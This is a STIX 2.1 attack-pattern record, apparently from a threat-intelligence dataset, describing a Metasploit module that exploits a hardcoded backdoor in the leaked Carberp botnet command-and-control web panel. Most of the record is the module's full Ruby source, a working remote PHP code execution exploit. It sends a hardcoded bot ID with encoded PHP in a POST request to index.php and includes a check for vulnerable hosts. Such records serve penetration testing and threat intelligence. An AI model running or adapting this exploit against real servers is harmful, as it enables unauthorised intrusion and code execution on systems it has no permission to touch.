{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b20e3de2-2562-4d70-bb0d-6f67d0061ddc",
    "created": "2024-08-14T17:13:16.817913Z",
    "modified": "2024-08-14T17:13:16.817917Z",
    "name": "Carberp Web Panel C2 Backdoor Remote PHP Code Execution",
    "description": " This module exploits backdoors that can be found all over the leaked source code of the Carberp botnet C2 Web Panel.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/carberp_backdoor_exec.rb",
            "external_id": "carberp_backdoor_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.xylibox.com/2013/06/carberp-remote-code-execution-carpwned.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Carberp Web Panel C2 Backdoor Remote PHP Code Execution',\n      'Description'    => %q{\n          This module exploits backdoors that can be found all over the leaked\n        source code of the Carberp botnet C2 Web Panel.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bwall(Brian Wallace) <bwallace[at]cylance.com>', # msf module\n          'connection(Luis Santana) <hacktalkblog[at]gmail.com>', # exploit reporting\n          'Steven K <xylitol[at]malwareint[d0t]com>' # discovery and reporting\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://www.xylibox.com/2013/06/carberp-remote-code-execution-carpwned.html']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Keys'        => ['php'],\n          'Space'       => 10000,\n          'DisableNops' => true\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['carberp', {}]\n        ],\n      'DisclosureDate' => '2013-06-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',[true, \"The path to the backdoor, often just index.php\", \"/index.php\"]),\n        OptString.new('BOTID', [true, 'Hardcoded backdoor bot ID that can run PHP eval', 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV']),\n      ])\n  end\n\n  def check\n    confirm_string = rand_text_alpha(8)\n    cmd = \"echo '#{confirm_string}';\"\n    shell = http_send_command(cmd)\n    check_code = Exploit::CheckCode::Safe\n\n    if shell and shell.body.include?(confirm_string)\n      check_code = Exploit::CheckCode::Vulnerable\n    end\n\n    check_code\n  end\n\n  def http_send_command(cmd)\n    uri = normalize_uri(target_uri.path.to_s)\n    request_parameters = {\n      'method'\t=> 'POST',\n      'uri'\t\t=> uri,\n      'vars_post'\t=>\n        {\n          'id' => datastore['BOTID'],\n          \"data\" => Rex::Text.encode_base64(cmd.unpack('H*'))\n        }\n    }\n    res = send_request_cgi(request_parameters)\n\n    res\n  end\n\n  def exploit\n    http_send_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-28",
    "x_mitre_platforms": [
        "['php']"
    ]
}